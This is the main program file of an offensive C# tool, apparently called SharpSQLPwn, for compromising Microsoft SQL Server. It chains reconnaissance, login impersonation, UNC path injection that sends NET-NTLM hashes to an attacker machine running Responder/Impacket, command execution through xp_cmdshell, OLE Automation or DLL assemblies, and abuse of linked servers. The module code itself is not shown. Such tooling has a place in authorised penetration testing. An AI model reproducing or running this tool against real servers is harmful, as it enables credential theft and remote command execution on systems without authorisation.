﻿using System;
using System.Data.SqlClient;

namespace SharpSQLPwn
{
    class Program
    {
        static void Main(string[] args)
        {
            var parsedArgs = Utilities.Options.ParseArgs(args);
            Utilities.Options.Arguments arguments = Utilities.Options.ArgumentValues(parsedArgs);

            Utilities.Options.ShowBanner();

            if (arguments.interactive) {
                Console.Write("\n[Q] Please enter SQL Server domain name (Press [Enter] to use local instance): ");
                String input = Console.ReadLine();
                String sqlServ;
                if (string.IsNullOrEmpty(input)) { sqlServ = System.Environment.MachineName; }
                else { sqlServ = input; }

                Console.Write("[Q] Please enter database name (Press [Enter] to use master): ");
                input = Console.ReadLine();
                String db;
                if (string.IsNullOrEmpty(input)) { db = "master"; }
                else { db = input; }

                SqlConnection coni = Utilities.Authentication.WindowsAuthenticate(sqlServ, db);

                Utilities.Functions.Recon(coni);

                Console.Write("[Q] Would you like to impersonate another user? [y/N]: ");
                String question_user = Console.ReadLine();
                if (question_user == "y" || question_user == "Y" || question_user == "YES" || question_user == "yes")
                {
                    Console.Write("[Q] Please enter the name of login to impersonate: ");
                    String implogin = Console.ReadLine();
                    Utilities.Functions.Impersonate(coni, implogin);
                }

                Console.Write("\n[Q] Would you like to try get NET-NTLM Hash? [NOTE: Ensure Responder/Impacket is listening] [y/N]: ");
                String question = Console.ReadLine();
                if (question == "y" || question == "Y" || question == "YES" || question == "yes")
                {
                    Console.Write("[Q] Please enter IP for attacker machine running Responder/Impacket: ");
                    String smb_ip = Console.ReadLine();

                    Utilities.Functions.UNCPathInjection(coni, smb_ip);
                    Console.ForegroundColor = ConsoleColor.Blue;
                }

                Console.Write("\n[Q] Would you like to try Command Execution on " + sqlServ + "? [y/N]: ");
                String question2 = Console.ReadLine();
                if (question2 == "y" || question2 == "Y" || question2 == "YES" || question2 == "yes")
                {
                    Console.Write("[Q] Which technique would you like to use?");
                    Console.Write("\n[Q] Enter 1 for xp_cmdshell, 2 for Ole Automation Procedures, 3 for DLL assembly: ");
                    int technique = Int32.Parse(Console.ReadLine());
                    String cmd;
                    Console.Write("[Q] Please enter command to execute: ");
                    cmd = Console.ReadLine();
                    Utilities.Functions.CmdExec(coni, technique, cmd);
                }

                Console.Write("\n[Q] Would you like to check access on linked SQL servers (if mentioned above)? [y/N]: ");
                String question3 = Console.ReadLine();
                if (question3 == "y" || question3 == "Y" || question3 == "YES" || question3 == "yes")
                {
                    Console.Write("[Q] Please enter linked SQL server name: ");
                    String linkedsqlserver = Console.ReadLine();
                    Utilities.Functions.LinkedServer(coni, linkedsqlserver, "", "", "");

                    Console.Write("\n[Q] Would you like to try get NET-NTLM Hash of remote SQL server? [NOTE: Ensure Responder/Impacket is listening] [y/N]: ");
                    String question4 = Console.ReadLine();
                    if (question4 == "y" || question4 == "Y" || question4 == "YES" || question4 == "yes")
                    {
                        Console.Write("[Q] Please enter IP for attacker machine running Responder/Impacket: ");
                        String smb_ip = Console.ReadLine();
                        Utilities.Functions.LinkedServer(coni, linkedsqlserver, smb_ip, "", "");
                    }

                    Console.Write("\n[Q] Would you like to enable xp_cmdshell and execute command on remote SQL server? [y/N]: ");
                    String question5 = Console.ReadLine();
                    if (question5 == "y" || question5 == "Y" || question5 == "YES" || question5 == "yes")
                    {
                        Console.Write("[Q] Please enter command to execute on " + linkedsqlserver + ": ");
                        String cmd;
                        cmd = Console.ReadLine();
                        Utilities.Functions.LinkedServer(coni, linkedsqlserver, "", cmd, "");
                    }

                }
                coni.Close();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[+] Done! Exiting ... ");
                Console.ResetColor();
                Environment.Exit(0);
            }

            if (arguments.sqlServer == "LocalMachine") { arguments.sqlServer = System.Environment.MachineName;}

            SqlConnection con = new SqlConnection();
            if (arguments.authMethod == "Windows") { con = Utilities.Authentication.WindowsAuthenticate(arguments.sqlServer, arguments.database); }
            else if (arguments.authMethod == "Local") {
                if (arguments.username != null && arguments.password != null) {
                    con = Utilities.Authentication.LocalAuthenticate(arguments.sqlServer, arguments.database, arguments.username, arguments.password);
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[-] Error: Please provide username and password");
                    Console.ResetColor();
                    Environment.Exit(0);
                }
            }
            else if (arguments.authMethod == "Azure") {
                if (arguments.username != null && arguments.password != null && arguments.domain != null)
                {
                    con = Utilities.Authentication.AzureAuthenticate(arguments.sqlServer, arguments.database, arguments.domain, arguments.username, arguments.password);
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[-] Error: Please provide domain, username and password");
                    Console.ResetColor();
                    Environment.Exit(0);
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[-] Error: Unknown authentication method " + arguments.authMethod);
                Console.ResetColor();
                Environment.Exit(0);
            }

            if (arguments.modules.Contains("R")) { Utilities.Functions.Recon(con); }
            if (arguments.modules.Contains("I")) { Utilities.Functions.Impersonate(con, arguments.impersonatedUser); }
            if (arguments.modules.Contains("Q")) { Utilities.Functions.CustomQuerySQL(con, arguments.customQuery); }
            if (arguments.modules.Contains("C")) { Utilities.Functions.CmdExec(con, arguments.cmdExecTechnique, arguments.cmdExecCommand); }
            if (arguments.modules.Contains("U")) { Utilities.Functions.UNCPathInjection(con, arguments.attackerIP); }
            if (arguments.modules.Contains("L")) { Utilities.Functions.LinkedServer(con, arguments.linkedSQLServer, arguments.attackerIP, arguments.cmdExecCommand, arguments.customQuery); }

            con.Close();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n[+] Done! Exiting ... \n");
            Console.ResetColor();
            Environment.Exit(0);
        }
    }
}